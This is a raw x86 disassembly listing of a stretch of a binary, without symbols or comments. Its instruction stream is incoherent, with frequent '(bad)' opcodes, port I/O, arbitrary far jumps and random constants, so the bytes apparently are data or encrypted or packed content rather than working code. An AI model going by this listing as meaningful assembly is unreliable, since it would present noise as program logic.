  415ec0:	xchg   esi,eax
  415ec1:	mov    DWORD PTR [ecx-0x20],ebp
  415ec4:	jmp    0xfeb93f21
  415ec9:	mov    ds:0x2f7a5a93,al
  415ece:	mov    bh,BYTE PTR [edi+0xf]
  415ed1:	push   esp
  415ed2:	outs   dx,BYTE PTR ds:[esi]
  415ed3:	and    ebp,DWORD PTR [esi+ebx*2]
  415ed6:	and    eax,0x19bb5a3e
  415edb:	retf   
  415edc:	add    al,0xf7
  415ede:	fsub   st(7),st
  415ee0:	mov    bh,0x1c
  415ee2:	or     eax,0xd35d8589
  415ee7:	out    dx,eax
  415ee8:	test   al,0xed
  415eea:	sbb    ecx,DWORD PTR [edi+0x66b0f97]
  415ef0:	xchg   ebx,eax
  415ef1:	mov    eax,ds:0x1f8ea9e8
  415ef6:	ret    0x27ea
  415ef9:	jae    0x415f34
  415efb:	cld    
  415efc:	pushf  
  415efd:	in     al,0x64
  415eff:	rcl    BYTE PTR [si],cl
  415f02:	mov    edx,0x389bd1f8
  415f07:	xchg   esp,eax
  415f08:	fnstcw WORD PTR [ebx-0x2b]
  415f0b:	mov    ebx,0x6fb2073e
  415f10:	ins    DWORD PTR es:[edi],dx
  415f11:	inc    eax
  415f12:	jb     0x415ee4
  415f14:	pop    esi
  415f15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f16:	xchg   edi,eax
  415f17:	imul   ebx,esp,0xffffffbe
  415f1a:	adc    eax,0xc9df4ee
  415f1f:	push   ds
  415f20:	imul   edx,DWORD PTR [edx+0x21e36c91],0xffffffc1
  415f27:	xor    DWORD PTR [eax-0x7b],ebp
  415f2a:	jno    0x415f1e
  415f2c:	or     ch,0x15
  415f2f:	dec    edx
  415f30:	fadd   st,st(6)
  415f32:	cmp    ebp,DWORD PTR [edx]
  415f34:	rcl    al,cl
  415f36:	inc    esp
  415f37:	and    ebx,DWORD PTR [edx-0x718de554]
  415f3d:	ins    DWORD PTR es:[edi],dx
  415f3e:	cmp    DWORD PTR [ebx-0x3b],eax
  415f41:	pushf  
  415f42:	push   cs
  415f43:	mov    ecx,0xcdbbc1d5
  415f48:	xchg   edx,eax
  415f49:	adc    DWORD PTR [ecx-0x442073b4],edi
  415f4f:	call   0x55329f70
  415f54:	into   
  415f55:	inc    esp
  415f56:	je     0x415f44
  415f58:	mov    ds:0xc5ae6304,al
  415f5d:	lea    esi,[ebx-0x1d98252]
  415f63:	sbb    al,0x23
  415f65:	(bad)  
  415f67:	or     bh,BYTE PTR [edi-0x34]
  415f6a:	xchg   ebp,eax
  415f6b:	call   0xb663fdd3
  415f70:	push   cs
  415f71:	mov    BYTE PTR [eax+0x23],dh
  415f74:	mov    ds:0x3ae303ce,eax
  415f79:	shl    DWORD PTR [edx-0x22],1
  415f7c:	loop   0x415ff2
  415f7e:	xchg   ebp,eax
  415f7f:	loopne 0x415fb3
  415f81:	stos   DWORD PTR es:[edi],eax
  415f82:	pop    ebp
  415f83:	(bad)  
  415f84:	xchg   ecx,eax
  415f85:	push   0x86e1d797
  415f8a:	or     ebx,DWORD PTR [eax+edi*8+0x1cbffb7d]
  415f91:	mov    edx,?
  415f93:	add    al,0x1b
  415f95:	mov    cl,0x57
  415f97:	mov    bl,0x73
  415f99:	push   ecx
  415f9a:	retf   0x6cbf
  415f9d:	mov    es,edi
  415f9f:	and    DWORD PTR [edx-0x47],0x5864abd0
  415fa6:	pop    es
  415fa7:	pop    ebp
  415fa8:	and    al,0xef
  415faa:	enter  0xf282,0x13
  415fae:	fnsave [edx]
  415fb0:	pop    ds
  415fb1:	div    BYTE PTR [ebp-0x20]
  415fb4:	fild   WORD PTR [ecx-0x488d6ae1]
  415fba:	mov    fs:0xb9065583,eax
  415fc0:	jmp    0xf966a23a
  415fc5:	loop   0x415f9c
  415fc7:	(bad)  [ecx-0x5f32694b]
  415fcd:	sbb    BYTE PTR [edx],0x87
  415fd0:	push   eax
  415fd1:	jmp    0x367e:0x53ce013b
  415fd8:	xchg   edi,eax
  415fd9:	in     eax,0x23
  415fdb:	lahf   
  415fdc:	cmp    eax,DWORD PTR [ebp-0x50]
  415fdf:	and    BYTE PTR [ebx-0x9d6cc82],0x5d
  415fe6:	je     0x415fe8
  415fe8:	sbb    ecx,DWORD PTR [eax+0x3d1e396a]
  415fee:	jno    0x415f98
  415ff0:	or     eax,0x8dfc12d5
  415ff5:	dec    esi
  415ff6:	nop
  415ff7:	aam    0xe2
  415ff9:	or     BYTE PTR [esi-0xf],0xb0
  415ffd:	arpl   WORD PTR [ebp+esi*4+0x3f947be1],si
  416004:	cld    
  416005:	jne    0x415faf
  416007:	add    bl,0x95
  41600a:	mov    ah,0xc4
  41600c:	push   ebx
  41600d:	call   0x990eff35
  416012:	out    dx,eax
  416013:	out    dx,eax
  416014:	clc    
  416015:	icebp  
  416016:	frstor [ecx+0x3f]
  416019:	push   0x5a
  41601b:	or     al,0x6a
  41601d:	cdq    
  41601e:	xor    al,0x99
  416020:	jbe    0x415fce
  416022:	adc    edi,edi
  416024:	dec    edi
  416025:	mov    ebp,0x98adc21e
  41602a:	call   0x2eb3c79a
  41602f:	fcomip st,st(3)
  416031:	dec    eax
  416032:	push   eax
  416033:	cli    
  416034:	clc    
  416035:	jb     0x415fed
  416037:	sar    DWORD PTR [ecx-0x5954878a],1
  41603d:	push   esp
  41603e:	xchg   ebx,eax
  41603f:	pop    es
  416040:	mov    BYTE PTR [eax+0x59],bh
  416043:	(bad)  
  416044:	es cmp eax,0xaefd7f91
  41604a:	(bad)  
  41604c:	cmp    BYTE PTR [ebp-0x7f703919],dh
  416052:	dec    edi
  416053:	and    dl,0x19
  416056:	mov    cs,WORD PTR [ebx-0x12]
  416059:	cmc    
  41605a:	inc    edx
  41605b:	or     ebx,DWORD PTR [ecx+0x16]
  41605e:	sub    al,0x7
  416060:	adc    al,0xed
  416062:	sbb    eax,0xd9f0de08
  416067:	clc    
  416068:	xor    al,0x28
  41606a:	pop    es
  41606b:	adc    BYTE PTR [eax+eax*4+0x6f],ah
  41606f:	or     ecx,DWORD PTR [ecx-0xad88228]
  416075:	aam    0x2c
  416077:	les    edx,FWORD PTR ds:0x1d602768
  41607d:	push   eax
  41607e:	ss pop ds
  416080:	stc    
  416081:	fwait
  416082:	jmp    0xbed:0xc1858cdc
  416089:	mov    dl,0x99
  41608b:	dec    edi
  41608c:	mov    esp,0xf5a31acb
  416091:	std    
  416092:	and    BYTE PTR [ebx],dh
  416094:	shl    DWORD PTR [edi-0xc],0x3
  416098:	xchg   bl,bh
  41609a:	mov    ?,WORD PTR [ebp+0x30c25e8b]
  4160a0:	scas   eax,DWORD PTR es:[edi]
  4160a1:	fldenv [eax-0x55]
  4160a4:	adc    esi,DWORD PTR [edi]
  4160a6:	pop    ecx
  4160a7:	pushf  
  4160a8:	imul   ebx,DWORD PTR [edi+eax*4],0x362500e
  4160af:	cli    
  4160b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b1:	add    al,0x8c
  4160b3:	sar    DWORD PTR [ebx+0x79],0xce
  4160b7:	fidiv  WORD PTR [eax]
  4160b9:	and    ecx,esi
  4160bb:	or     eax,0xb472e15b
  4160c0:	mov    ebx,0xb38dbd62
  4160c5:	mov    BYTE PTR [ebx+ebx*4+0x7e],ah
  4160c9:	int3   
  4160ca:	xchg   ebx,eax
  4160cb:	test   al,al
  4160cd:	js     0x41604f
  4160cf:	mov    ecx,0xfe931b22
  4160d4:	cmc    
  4160d5:	test   eax,0x25f93c43
  4160da:	sahf   
  4160db:	jnp    0x4160e8
  4160dd:	inc    eax
  4160de:	or     al,0x80
  4160e0:	and    esi,DWORD PTR [edx-0x60]
  4160e3:	add    esi,DWORD PTR [eax]
  4160e5:	outs   dx,DWORD PTR ds:[esi]
  4160e6:	int3   
  4160e7:	xor    BYTE PTR [ebp-0x6a],dl
  4160ea:	shl    BYTE PTR [edx-0x70e8aa0c],1
  4160f0:	ins    BYTE PTR es:[edi],dx
  4160f1:	daa    
  4160f2:	adc    al,0xf7
  4160f4:	xor    BYTE PTR [edx-0x5991232c],ah
  4160fa:	cmp    DWORD PTR [edi-0x44],ecx
  4160fd:	mov    dh,0x2a
  4160ff:	(bad)  
  416100:	sbb    bh,BYTE PTR [ebp+0xabbe63f]
  416106:	mov    DWORD PTR ds:0xb79ae343,esp
  41610c:	retf   0xd0c9
  41610f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416110:	pushf  
  416111:	imul   esp,DWORD PTR [ecx-0x66],0xffffffd3
  416115:	dec    ah
  416117:	lock push ds
  416119:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41611a:	inc    ebx
  41611b:	cmp    DWORD PTR [ecx-0x544697ef],ecx
  416121:	retf   
  416122:	cmp    DWORD PTR [eax-0x52],edx
  416125:	cdq    
  416126:	mov    BYTE PTR [esi+0xf01e04c],dh
  41612c:	iret   
  41612d:	xchg   ebp,esi
  41612f:	inc    edx
  416130:	sbb    esp,esi
  416132:	dec    ebx
  416133:	add    eax,0x6a361e2d
  416138:	jle    0x416159
  41613a:	or     eax,0x716db144
  41613f:	rcr    DWORD PTR [edi+0x2],1
  416142:	mov    al,ds:0x190be04f
  416147:	inc    edi
  416148:	leave  
  416149:	mov    edi,0x5062591c
  41614e:	shl    esp,cl
  416150:	inc    eax
  416151:	push   edi
  416152:	and    ch,cl
  416154:	mov    edx,0xc5259522
  416159:	sti    
  41615a:	aaa    
  41615b:	mov    eax,ds:0xe05072e5
  416160:	and    al,0xb3
  416162:	sar    BYTE PTR [ecx-0x11b6d2f6],0x2c
  416169:	xchg   esi,eax
  41616a:	repz jne 0x41611c
  41616d:	jb     0x4161be
  41616f:	call   0xfd8298a9
  416174:	dec    esi
  416175:	stc    
  416176:	test   eax,0x93d3e32d
  41617b:	test   edx,esi
  41617d:	push   ss
  41617e:	mov    edi,0x5618a152
  416183:	cdq    
  416184:	fdivr  QWORD PTR [eax-0x706369a0]
  41618a:	pop    ds
  41618b:	pop    esi
  41618c:	and    edx,esi
  41618e:	mul    DWORD PTR [esi+edx*4]
  416191:	paddsw mm0,QWORD PTR [eax-0x2e67e7e3]
  416198:	mov    ebx,0xe58222b6
  41619d:	retf   
  41619e:	adc    DWORD PTR [ecx],esp
  4161a0:	out    0x5,al
  4161a2:	sbb    edi,esi
  4161a4:	pop    es
  4161a5:	add    edx,DWORD PTR [edi]
  4161a7:	pop    esi
  4161a8:	sbb    dh,dl
  4161aa:	push   ebx
  4161ab:	das    
  4161ac:	dec    ecx
  4161ad:	js     0x416217
  4161af:	cmp    esi,DWORD PTR [eax]
  4161b1:	aas    
  4161b2:	pcmpgtb mm3,mm0
  4161b5:	mov    esp,0x7f93f2a5
  4161ba:	outs   dx,BYTE PTR ds:[esi]
  4161bb:	mov    dh,0xb6
  4161bd:	pushf  
  4161be:	xor    al,BYTE PTR [ebp-0x7b2661df]
  4161c4:	push   edi
  4161c5:	xor    BYTE PTR ds:0x4e1ec3b7,al
  4161cb:	and    esp,edx
  4161cd:	jmp    0x24b468c2
  4161d2:	fs mul al
  4161d5:	mov    dh,0x45
  4161d7:	sbb    al,0xc
  4161d9:	mov    dl,0x77
  4161db:	les    edx,FWORD PTR [edx-0x78]
  4161de:	inc    ecx
  4161df:	or     ebp,DWORD PTR [esi+edx*2+0x5d]
  4161e3:	addr16 pop ebx
  4161e5:	pushf  
  4161e6:	call   0xbb6cf9f3
  4161eb:	inc    edi
  4161ec:	pop    esp
  4161ed:	dec    ebx
  4161ee:	push   ebp
  4161ef:	jb     0x4161fe
  4161f1:	mov    eax,ds:0x7cb7482f
  4161f6:	push   ds
  4161f7:	jle    0x41617b
  4161f9:	push   ebp
  4161fa:	dec    ebx
  4161fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161fc:	data16 mov al,0xd
  4161ff:	sub    eax,DWORD PTR ds:0x41ff3813
  416205:	inc    edx
  416206:	inc    edx
  416207:	and    eax,0x9adfa175
  41620c:	outs   dx,BYTE PTR ds:[esi]
  41620d:	sbb    al,0x21
  41620f:	imul   esi,DWORD PTR [edx-0x1d073cac],0x7f87536d
  416219:	mov    dh,0xb
  41621b:	fimul  WORD PTR [eax-0x5d]
  41621e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41621f:	enter  0xc3dc,0xaf
  416223:	les    eax,FWORD PTR [ebx-0x5b6cbe71]
  416229:	in     eax,dx
  41622a:	dec    ecx
  41622b:	sti    
  41622c:	aas    
  41622d:	inc    edi
  41622e:	popa   
  41622f:	add    eax,0x55607d85
  416234:	aad    0x8a
  416236:	dec    edi
  416237:	adc    eax,DWORD PTR [edi-0x1ba5c5b0]
  41623d:	mov    ax,ds:0xfb4b7654
  416243:	xlat   BYTE PTR ds:[ebx]
  416244:	jmp    0x94985f9a
  416249:	adc    eax,eax
  41624b:	retf   
  41624c:	pop    ds
  41624d:	daa    
  41624e:	repnz pop esp
  416250:	push   edi
  416251:	rcr    DWORD PTR [ecx-0x6],1
  416254:	push   eax
  416255:	push   cs
  416256:	inc    eax
  416257:	lods   eax,DWORD PTR ds:[esi]
  416258:	dec    ebx
  416259:	dec    eax
  41625a:	mov    ebp,0x5ec04a2b
  41625f:	pop    edx
  416260:	cmp    eax,0xb491331b
  416265:	jmp    0x59058a50
  41626a:	into   
  41626b:	mov    ah,0xd0
  41626d:	sti    
  41626e:	jp     0x41623f
  416270:	mov    eax,0xebf97234
  416275:	nop
  416276:	sbb    eax,0xab635781
  41627b:	add    eax,0x2ec19745
  416280:	rcl    DWORD PTR [edi],cl
  416282:	jmp    0x41620f
  416284:	mov    eax,0x199ff76c
  416289:	sbb    edx,DWORD PTR [edi+edi*2]
  41628c:	xchg   ecx,eax
  41628d:	jecxz  0x41622b
  41628f:	adc    al,0x98
  416291:	xchg   BYTE PTR [ebx+0x72db5abd],dh
  416297:	sbb    dl,0x6f
  41629a:	jge    0x4162b4
  41629c:	stos   BYTE PTR es:[edi],al
  41629d:	ins    DWORD PTR es:[edi],dx
  41629e:	jnp    0x41629e
  4162a0:	dec    esi
  4162a1:	adc    ebp,DWORD PTR [ebp+0x70a8a84]
  4162a7:	pop    edx
  4162a8:	mov    bl,BYTE PTR [ebx-0x48c071d3]
  4162ae:	imul   edx,esi,0xb289e2da
  4162b4:	and    BYTE PTR [ebx+0xe],bl
  4162b7:	push   0xffffff8c
  4162b9:	and    DWORD PTR [edi],0xfad876d0
  4162bf:	mov    esi,0x26e9f517
  4162c4:	mov    WORD PTR [ebp+0x6065f48c],cs
  4162ca:	and    DWORD PTR [edi+0xf5d6bee],ecx
  4162d0:	and    BYTE PTR [eax],ah
  4162d2:	adc    esp,edi
  4162d4:	(bad)  
  4162d5:	call   0xb48b:0xfcf5c6b
  4162dc:	call   0x2e63:0x67015059
  4162e3:	or     BYTE PTR [esi+0x198dee2a],ah
  4162e9:	ins    DWORD PTR es:[edi],dx
  4162ea:	sub    al,0x38
  4162ec:	pop    eax
  4162ed:	jmp    0x1631159f
  4162f2:	xlat   BYTE PTR ds:[ebx]
  4162f3:	enter  0x3aeb,0x68
  4162f7:	sub    DWORD PTR [edx+0x5c1f2356],eax
  4162fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162fe:	stos   DWORD PTR es:[edi],eax
  4162ff:	imul   ecx,DWORD PTR [ecx-0x19677e67],0xa655c8b3
  416309:	push   eax
  41630a:	xchg   edx,eax
  41630b:	fucom  st(5)
  41630d:	loope  0x416314
  41630f:	imul   edx,DWORD PTR [ebx-0x51],0xffffffaf
  416313:	sbb    al,0x60
  416315:	mov    ebp,DWORD PTR [edx+ebp*1+0x68]
  416319:	mov    ebx,DWORD PTR [ebx]
  41631b:	cmp    al,0x51
  41631d:	ja     0x4162b6
  41631f:	hlt    
  416320:	mov    ah,0x97
  416322:	sub    bh,BYTE PTR [ebx+ebp*2+0x5e]
  416326:	cmp    al,0x3a
  416328:	(bad)  
  416329:	scas   al,BYTE PTR es:[edi]
  41632a:	std    
  41632b:	mov    cl,BYTE PTR ss:[esp+ebp*8-0x16f3c1fe]
  416333:	cmp    cl,bl
  416335:	in     eax,dx
  416336:	lahf   
  416337:	or     edx,DWORD PTR [ebp+0x4bb885f4]
  41633d:	fild   DWORD PTR [eax-0x4af166a1]
  416343:	arpl   dx,bp
  416345:	mov    esp,0xae23241d
  41634a:	or     ebp,edx
  41634c:	clc    
  41634d:	icebp  
  41634e:	fnsave [edx]
  416350:	mov    edi,0xf497ac54
  416355:	adc    al,0x1a
  416357:	push   0x2ce7c49a
  41635c:	sub    al,0x21
  41635e:	std    
  41635f:	jb     0x41631a
  416361:	iret   
  416362:	mov    bh,0x40
  416364:	fadd   QWORD PTR [edx+0x22]
  416367:	sub    eax,0xec84eb89
  41636c:	ja     0x4163ac
  41636e:	mov    dh,0x9e
  416370:	dec    edi
  416371:	sbb    DWORD PTR [ebx+ecx*8+0x6750103d],0x1a
  416379:	(bad)  
  41637a:	push   DWORD PTR [edi+0x69]
  41637d:	ins    BYTE PTR es:[edi],dx
  41637e:	(bad)
  416383:	mov    edi,0x3085ca95
  416388:	mov    al,0xe7
  41638a:	loopne 0x4163a7
  41638c:	dec    edx
  41638d:	xchg   esp,eax
  41638e:	scas   al,BYTE PTR es:[edi]
  41638f:	(bad)  
  416390:	loopne 0x4163de
  416392:	cdq    
  416393:	xor    al,0xb1
  416395:	or     BYTE PTR [ebx+0x91a3fe4],al
  41639b:	out    dx,al
  41639c:	cmp    al,0x38
  41639e:	js     0x4163fb
  4163a0:	cli    
  4163a1:	imul   esi,eax,0xed3003cc
  4163a7:	retf   0xae69
  4163aa:	(bad)  
  4163ac:	repnz add dh,BYTE PTR [edi-0x499dcdce]
  4163b3:	ret    
  4163b4:	push   edi
  4163b5:	push   edi
  4163b6:	pop    esi
  4163b7:	xchg   DWORD PTR [edi-0x77],edi
  4163ba:	scas   eax,DWORD PTR es:[edi]
  4163bb:	fsubr  DWORD PTR [esi]
  4163bd:	push   esp
  4163be:	sbb    al,0xf1
  4163c0:	jecxz  0x416399
  4163c2:	xchg   ecx,eax
  4163c3:	daa    
  4163c4:	int3   
  4163c5:	xlat   BYTE PTR ds:[ebx]
  4163c6:	retf   
  4163c7:	xor    edx,eax
  4163c9:	clc    
  4163ca:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163cd:	pusha  
  4163ce:	lahf   
  4163cf:	sbb    ebp,DWORD PTR [edx]
  4163d1:	pop    ebp
  4163d2:	ret    0x5e96
  4163d5:	jne    0x4163b3
  4163d7:	lahf   
  4163d8:	jp     0x4163d7
  4163da:	and    DWORD PTR [esi+0x56d0b481],edi
  4163e0:	adc    ah,al
  4163e2:	mov    ebp,ebp
  4163e4:	nop
  4163e5:	pop    ss
  4163e6:	dec    ecx
  4163e7:	(bad)  
  4163e8:	fadd   st,st(5)
  4163ea:	push   esi
  4163eb:	retf   0x8546
  4163ee:	jne    0x41637d
  4163f0:	leave  
  4163f1:	rcr    DWORD PTR [ebx-0x12],cl
  4163f4:	jmp    0x4163dd
  4163f6:	add    eax,0xccb585f4
  4163fb:	mov    BYTE PTR [edi+0x71],ah
  4163fe:	loop   0x416469
  416400:	sbb    DWORD PTR [edx+0xb],edx
  416403:	fild   DWORD PTR [edi+0x29]
  416406:	sub    DWORD PTR [edi-0x7e],eax
  416409:	fistp  WORD PTR [edx]
  41640b:	clc    
  41640c:	dec    esi
  41640d:	stos   BYTE PTR es:[edi],al
  41640e:	dec    ebp
  41640f:	jo     0x416415
  416411:	mov    bh,0x4
  416413:	add    ebx,DWORD PTR [ecx+0x5d]
  416416:	in     eax,0x87
  416418:	les    ebp,FWORD PTR [edx+0x8]
  41641b:	inc    edx
  41641c:	lds    eax,FWORD PTR ds:0x49aa7254
  416422:	loope  0x4163f3
  416424:	(bad)  
  416425:	sub    eax,0xd20716f7
  41642a:	jnp    0x4164a7
  41642c:	xor    BYTE PTR [edi+ebx*4+0x7b],al
  416430:	aad    0x3
  416432:	scas   al,BYTE PTR es:[edi]
  416433:	data16 gs jb 0x4163f2
  416437:	jge    0x41646e
  416439:	iret   
  41643a:	enter  0x77ea,0xbb
  41643e:	mov    ?,eax
  416440:	mov    dl,0x63
  416442:	inc    ebx
  416443:	ins    BYTE PTR es:[edi],dx
  416444:	aad    0x4b
  416446:	imul   edx,DWORD PTR [edi+0xd20beb8],0x9
  41644d:	(bad)  
  41644e:	aad    0x16
  416450:	jb     0x41646b
  416452:	sub    al,0x53
  416454:	mov    dl,0x6a
  416456:	in     al,0xa5
  416458:	pop    esp
  416459:	(bad)  
  41645a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41645b:	xchg   esi,eax
  41645c:	push   cs
  41645d:	push   ss
  41645e:	addr16 mov eax,0x270d15db
  416464:	pop    edx
  416465:	mov    eax,0x1f4d2f61
  41646a:	jb     0x41644c
  41646c:	pop    edi
  41646d:	sbb    BYTE PTR [ecx+0x3f3b6d95],dl
  416473:	cmp    eax,esi
  416475:	aad    0x99
  416477:	mov    edi,0x286e0605
  41647c:	icebp  
  41647d:	pop    ebx
  41647e:	push   edi
  41647f:	les    ecx,FWORD PTR gs:[ebx]
  416482:	jmp    0xc077a768
  416487:	ins    DWORD PTR es:[edi],dx
  416488:	mov    esi,0x48d86fce
  41648d:	repz cmp ebx,0x39
  416491:	jecxz  0x4164a1
  416493:	mov    ecx,0xabf56485
  416498:	stc    
  416499:	imul   ecx,eax,0xf44929f4
  41649f:	loope  0x4164d2
  4164a1:	mov    esp,0xf2360ddc
  4164a6:	sub    BYTE PTR [edi+0x3799ec1],al
  4164ac:	adc    DWORD PTR [ebp+0x3127eaba],0xffffffd6
  4164b3:	outs   dx,DWORD PTR ds:[esi]
  4164b4:	loope  0x4164ea
  4164b6:	adc    DWORD PTR [ecx-0x2c],ebx
  4164b9:	cmp    ah,dh
  4164bb:	icebp  
  4164bc:	sub    eax,edi
  4164be:	ja     0x4164b3
  4164c0:	scas   al,BYTE PTR es:[edi]
  4164c1:	fwait
  4164c2:	pop    es
  4164c3:	jl     0x416483
  4164c5:	adc    bl,bl
  4164c7:	mov    ebx,0xada741e7
  4164cc:	fwait
  4164cd:	sbb    al,0x34
  4164cf:	punpckhwd mm0,QWORD PTR [edi+0x72]
  4164d3:	jae    0x41647b
  4164d5:	rcl    BYTE PTR [edx-0x66],0x67
  4164d9:	call   0x62a2:0x5178df45
  4164e0:	cli    
  4164e1:	nop
  4164e2:	fiadd  WORD PTR [edi+0x12]
  4164e5:	imul   edi,eax,0x18ec538f
  4164eb:	push   ebx
  4164ec:	leave  
  4164ed:	retf   
  4164ee:	inc    eax
  4164ef:	push   ds
  4164f0:	jae    0x41648b
  4164f2:	lds    ebx,FWORD PTR ds:0x381f4885
  4164f8:	jp     0x4164a9
  4164fa:	xchg   ecx,eax
  4164fb:	ins    BYTE PTR es:[edi],dx
  4164fc:	(bad)
  416500:	inc    ebp
  416501:	xlat   BYTE PTR ds:[ebx]
  416502:	cs gs js 0x41648c
  416506:	jne    0x4164d2
  416508:	(bad)  
  41650a:	sbb    DWORD PTR [ebx-0x1b6b8d1c],edi
  416510:	or     eax,0xd9448198
  416515:	mov    dh,bl
  416517:	cs aad 0x1b
  41651a:	add    eax,0xd6193d5d
  41651f:	adc    eax,0xe8b22974
  416524:	inc    edx
  416525:	cs jmp 0x47b19878
  41652b:	pop    eax
  41652c:	mov    bh,0x43
  41652e:	in     al,dx
  41652f:	xchg   BYTE PTR [edi-0x7],dl
  416532:	add    dh,0x93
  416535:	jbe    0x4165a5
  416537:	xor    dh,0x3a
  41653a:	test   eax,0x197610bd
  41653f:	sbb    al,0xe6
  416541:	xchg   edx,eax
  416542:	or     DWORD PTR [edi-0x7936486d],edx
  416548:	stos   DWORD PTR es:[edi],eax
  416549:	cmp    edi,0x5f
  41654c:	or     edx,esp
  41654e:	jmp    0x7ac02d06
  416553:	dec    eax
  416554:	xor    eax,0xc31612a1
  416559:	mov    ah,BYTE PTR [ecx-0x3dc1db92]
  41655f:	mov    al,ah
  416561:	mov    ds:0x263d018f,eax
  416566:	repnz ss in al,dx
  416569:	mov    bh,0x76
  41656b:	imul   edx,DWORD PTR [esi-0x7e591f60],0x5f
  416572:	fistp  WORD PTR [esi+0x7e]
  416575:	test   DWORD PTR [ebx+0xf70cabf],eax
  41657b:	and    al,ah
  41657d:	cmp    BYTE PTR [edi+0x59677927],dh
  416583:	push   0xceb62e4d
  416588:	ins    BYTE PTR es:[edi],dx
  416589:	in     al,0xa9
  41658b:	adc    BYTE PTR [ebp+0x6f],ah
  41658e:	push   0xffffffab
  416590:	xchg   BYTE PTR [ecx+0x5e367ca7],al
  416596:	pop    es
  416597:	add    eax,esp
  416599:	int    0xec
  41659b:	test   DWORD PTR [edi+0x7],esi
  41659e:	mov    ebx,0xe260e6ca
  4165a3:	mov    esp,0x7b9fa3b3
  4165a8:	dec    ebp
  4165a9:	enter  0xd697,0xbc
  4165ad:	or     ecx,ebp
  4165af:	adc    al,0x1
  4165b1:	adc    al,0x44
  4165b3:	xor    BYTE PTR es:[ebp+ebx*4-0x2a],0xa8
  4165b9:	xchg   edi,eax
  4165ba:	and    DWORD PTR [ebx-0x45],edx
  4165bd:	sbb    eax,edi
  4165bf:	cmc    
  4165c0:	xor    ch,BYTE PTR ds:0xa3619112
  4165c6:	mov    ebx,DWORD PTR [esi]
  4165c8:	data16 int3 
  4165ca:	mov    ecx,0xce2dad8f
  4165cf:	inc    ebp
  4165d0:	inc    edi
  4165d1:	lods   al,BYTE PTR ds:[esi]
  4165d2:	ja     0x4165e0
  4165d4:	xor    ebx,ebp
  4165d6:	(bad)  
  4165d7:	fcmovne st,st(5)
  4165d9:	pop    ecx
  4165da:	or     ebp,ebp
  4165dc:	pop    edi
  4165dd:	cld    
  4165de:	xor    BYTE PTR [esi+0x29],bh
  4165e1:	mov    ds:0x2736efed,al
  4165e6:	cld    
  4165e7:	(bad)  
  4165e8:	test   BYTE PTR [ebx-0x3b],0x18
  4165ec:	aas    
  4165ed:	mov    BYTE PTR [esi-0x2a],dl
  4165f0:	mov    ds:0xeed026d4,al
  4165f5:	rcr    DWORD PTR [edi-0x7f],0xf7
  4165f9:	arpl   WORD PTR [edi],si
  4165fb:	pop    es
  4165fc:	repz push ecx
  4165fe:	enter  0x2e74,0xcd
  416602:	in     eax,dx
  416603:	add    al,0xb2
  416605:	dec    edi
  416606:	inc    eax
  416607:	sub    eax,0x5f082ab6
  41660c:	jmp    ebx
  41660e:	pusha  
  41660f:	in     eax,dx
  416610:	pmulhuw mm4,QWORD PTR [esi+0x7b]
  416614:	in     al,0x56
  416616:	loope  0x416639
  416618:	inc    esp
  416619:	jbe    0x4165dd
  41661b:	jle    0x416679
  41661d:	fisttp WORD PTR fs:[edx]
  416620:	xchg   BYTE PTR [edi+0x73],dl
  416623:	xor    ecx,DWORD PTR fs:[eax+edi*2-0x4e]
  416628:	shr    ebx,0x1e
  41662b:	fcmovnb st,st(5)
  41662d:	xor    DWORD PTR [edx-0x73],edi
  416630:	cli    
  416631:	dec    ah
  416633:	jb     0x4165e8
  416635:	xchg   DWORD PTR ds:0x6090f6d2,edi
  41663b:	and    BYTE PTR [eax+0x25],dh
  41663e:	pop    es
  41663f:	pop    es
  416640:	pop    esi
  416641:	mov    BYTE PTR [edx-0x3cb38925],bl
  416647:	pop    ecx
  416648:	pop    eax
  416649:	cli    
  41664a:	pushf  
  41664b:	and    eax,0x3dbed27c
  416650:	fwait
  416651:	std    
  416652:	push   ds
  416653:	pop    esp
  416654:	les    esi,FWORD PTR [ebp+0x75]
  416657:	pusha  
  416658:	xor    BYTE PTR [ecx],dh
  41665a:	push   0x39
  41665c:	sar    cl,1
  41665e:	add    edi,DWORD PTR [edi-0x73]
  416661:	sbb    DWORD PTR [edi+0x7d],ecx
  416664:	inc    esi
  416665:	lods   al,BYTE PTR ds:[esi]
  416666:	sti    
  416667:	not    BYTE PTR [ecx]
  416669:	(bad)  
  41666a:	mov    edi,ebp
  41666c:	jge    0x416649
  41666e:	inc    ecx
  41666f:	sti    
  416670:	test   BYTE PTR [eax-0x5c],cl
  416673:	fdivr  QWORD PTR [ecx+0x72]
  416676:	adc    BYTE PTR [eax+0x50985de1],0xcd
  41667d:	test   bl,bl
  41667f:	cmp    DWORD PTR [edx+0x1b],ebx
  416682:	fld    TBYTE PTR [edx+eiz*1]
  416685:	add    eax,0x9977c445
  41668a:	test   DWORD PTR [ebx],esp
  41668c:	mov    bl,0xe4
  41668e:	leave  
  41668f:	push   es
  416690:	and    ebx,DWORD PTR [esi]
  416692:	jbe    0x416629
  416694:	mov    esi,0xd6d66ce2
  416699:	clc    
  41669a:	nop
  41669b:	stos   BYTE PTR es:[edi],al
  41669c:	jmp    0xc54c:0xc79ef038
  4166a3:	scas   eax,DWORD PTR es:[edi]
  4166a4:	fs into 
  4166a6:	ror    DWORD PTR [eax],1
  4166a8:	dec    ebp
  4166a9:	sub    eax,0xf7688fda
  4166ae:	stos   BYTE PTR es:[edi],al
  4166af:	push   esi
  4166b0:	mov    esp,0x422a4e99
  4166b5:	in     al,dx
  4166b6:	fisttp DWORD PTR [ecx]
  4166b8:	call   0x8d853267
  4166bd:	fs stos BYTE PTR es:[edi],al
  4166bf:	iret   
  4166c0:	test   al,0x27
  4166c2:	call   0x37e9b58
  4166c7:	xlat   BYTE PTR ds:[ebx]
  4166c8:	jnp    0x416672
  4166ca:	push   0x38dd491a
  4166cf:	add    DWORD PTR ds:0xca734138,esi
  4166d5:	dec    ebx
  4166d6:	cwde   
  4166d7:	sbb    BYTE PTR [eax],cl
  4166d9:	cmp    BYTE PTR [esi-0x50a1775b],ah
